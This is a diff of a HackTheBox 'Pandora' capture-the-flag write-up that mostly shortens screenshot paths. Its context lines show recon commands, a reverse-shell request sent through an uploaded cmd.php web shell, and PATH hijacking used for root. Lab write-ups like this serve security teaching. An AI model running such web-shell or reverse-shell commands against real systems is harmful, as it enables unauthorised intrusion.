@@ -36,7 +36,7 @@ Privilege escalation is achieved by abusing a misconfigured binary (`pandora_bac
 ping -c 1 10.10.11.136
 ```
 
-![](HackTheBox/EASY/Pandora/screenshots/ping.png)
+![](screenshots/ping.png)
 
 The host responds, confirming it is alive.
 
@@ -54,7 +54,7 @@ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.136 -oG allPorts
 - `-Pn`: Skip host discovery (already confirmed alive)  
 - `-oG`: Output in grepable format
 
-![](HackTheBox/EASY/Pandora/screenshots/allports.png)
+![](screenshots/allports.png)
 
 Extract open ports:
 
@@ -62,7 +62,7 @@ Extract open ports:
 extractPorts allPorts
 ```
 
-![](HackTheBox/EASY/Pandora/screenshots/extractports.png)
+![](screenshots/extractports.png)
 
 ---
 ### 1.3 Targeted Scan
@@ -81,7 +81,7 @@ Let's check the result:
 cat targeted -l java
 ```
 
-![](HackTheBox/EASY/Pandora/screenshots/targeted.png)
+![](screenshots/targeted.png)
 
 | Port | Service | Version/Description |
 |------|---------|---------------------|
@@ -93,7 +93,7 @@ cat targeted -l java
 
 Check Ubuntu release via **launchpad**:
 
-![](HackTheBox/EASY/Pandora/screenshots/launchpad.png)
+![](screenshots/launchpad.png)
 
 Ubuntu version: **Focal**.
 
@@ -103,7 +103,7 @@ Fingerprint web technologies:
 whatweb http://10.10.11.136
 ```
 
-![](HackTheBox/EASY/Pandora/screenshots/whatweb.png)
+![](screenshots/whatweb.png)
 
 Interesting findings:
 - Domain → `panda.htb`
@@ -111,7 +111,7 @@ Interesting findings:
 
 Browsing main page:
 
-![](HackTheBox/EASY/Pandora/screenshots/web.png)
+![](screenshots/web.png)
 
 Contact form confirms valid emails:
 
@@ -269,7 +269,7 @@ http://127.0.0.1/pandora_console/images/0.Pwn3d/cmd.php?cmd=bash -c "bash -i >%2
 ![](screenshots/pandora_console_netcat.png)
 
 ✅ **User flag obtained**  
-![](HackTheBox/EASY/Pandora/screenshots/user_flag.png)
+![](screenshots/user_flag.png)
 
 ---
 ## 6. Privilege Escalation
@@ -326,7 +326,7 @@ echo $PATH
 ![](screenshots/path_hijacking.png)
 
 🏁 **Root flag obtained**  
-![](HackTheBox/EASY/Pandora/screenshots/root_flag.png)
+![](screenshots/root_flag.png)
 
 ---
 # ✅ MACHINE COMPLETE
